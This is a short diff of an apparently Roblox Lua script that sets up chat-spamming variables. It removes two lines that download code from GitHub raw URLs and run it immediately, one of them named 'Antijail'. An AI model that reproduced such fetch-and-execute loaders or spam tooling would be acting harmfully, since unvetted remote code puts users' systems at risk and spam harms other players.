@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/D/main/Hx"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Antijail/main/Hi"))()
 -- Initialize variables
 local isSpamming = false
 local spamMessage = "" -- Initialize the spam message
